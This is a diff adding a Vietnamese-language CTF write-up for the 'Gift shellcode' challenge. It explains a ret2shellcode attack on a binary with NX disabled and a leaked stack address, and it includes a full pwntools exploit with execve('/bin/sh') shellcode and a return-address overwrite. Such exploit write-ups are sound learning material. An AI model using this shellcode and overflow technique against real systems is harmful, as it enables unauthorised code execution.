@@ -115,3 +115,38 @@ Thì hàm flat() đại loại sẽ pack() các dữ liệu mình vào thay vì 
 
 # Gift shellcode
 file: [giftshellcode](https://github.com/wan-hyhty/CTFs_competition/blob/main/Securinet%20Valentine/source/giftshell)
+### Hình ảnh ida  
+![image](https://user-images.githubusercontent.com/111769169/219426864-8d5bdca6-6555-44e3-ad97-17b30f25d136.png)  
+Cùng với checksec ra NX tắt, chắc chắn là ret2shellcode  
+___
+Đầu tiên ta thấy chương trình leak cho ta địa chỉ đầu tiên stack của buf, bây giờ payload sẽ là shellcode, nhập đủ 120 kí tự offset thanh rip sau đó truyền vào địa chỉ đầu stack biến buf =)))  
+```python3
+from pwn import *
+
+exe = ELF('./giftshell', checksec=False)
+p = process(exe.path)
+input()
+p.recvuntil(b'products! ')
+leak = int(p.recv(14), 16)
+
+shellcode = asm(
+    '''
+    mov rax, 0x3b
+    mov rdi, 29400045130965551
+    push rdi
+    
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+    
+    syscall
+    ''', arch='amd64'
+)
+
+payload = shellcode 
+payload = payload.ljust(120)
+payload += p64(leak)
+p.sendafter(b'Input: \n', payload)
+
+p.interactive()
+```
